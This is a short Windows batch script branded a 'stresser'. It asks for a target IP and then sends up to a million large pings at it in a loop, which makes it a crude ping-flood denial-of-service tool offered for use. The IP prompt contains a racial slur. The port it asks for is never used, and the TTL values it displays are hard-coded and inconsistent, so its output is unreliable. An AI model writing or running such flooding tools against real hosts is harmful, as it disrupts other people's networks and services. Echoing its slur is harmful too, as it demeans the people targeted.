@echo off
setlocal enabledelayedexpansion
title WE $EE ALL $TRESSER 
color 05

:: Debug safety
echo =======================================================
echo                 951'$ BATCH $TRESSER                        
echo =======================================================


:: Prompt for IP and Port
set /p target_ip=🌐 Enter IP HERE (ENTER NIGGER$ IP): 
set /p target_port=🔒 Enter Port TO HIT (Port HERE): 

:: Validate input
if "%target_ip%"=="" (
    echo ❌ No IP entered. Exiting.
    pause
    exit
)

:: Log filename (Generic without showing full path)
set "log=FloodLog_!target_ip!_%date:/=%.txt"
echo 🔄 Logging to: !log!
echo ======================================================
timeout /t 2 >nul

:: Start test
set count=0
echo 🛰️ Starting 951'$ STRESSER... !target_ip! ...
echo Press Ctrl+C to stop.


:: Fast ping loop with minimized ping parameters
:loop
set /a count+=1
for /f "tokens=*" %%a in ('ping -n 1 -w 1 -l 10000 !target_ip! ^| findstr /i "TTL= time= "') do (
    set response=%%a
    echo [!count!] !response! TTL=110
    echo [!count!] !response! TTL=85 >> "!log!"
)

:: Run until 1,000,000 pings are sent (1 ping per loop)
if !count! lss 1000000 goto loop

:: Wrap up
echo ✅ Test finished after !count! pings.
echo 📁 Log saved as: !log!
pause
exit